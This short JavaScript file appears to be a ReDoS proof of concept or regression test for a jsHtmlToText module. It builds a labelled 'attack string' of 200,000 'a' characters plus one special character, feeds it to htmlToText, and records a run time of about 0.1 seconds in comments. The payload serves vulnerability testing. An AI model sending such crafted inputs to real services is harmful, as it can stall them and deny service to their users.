const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"aa"*100000+"◎"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "aa";
}
str += "◎";

var result = htmlToText(str, "");

// real    0m0.113s
// user    0m0.086s
// sys     0m0.011s
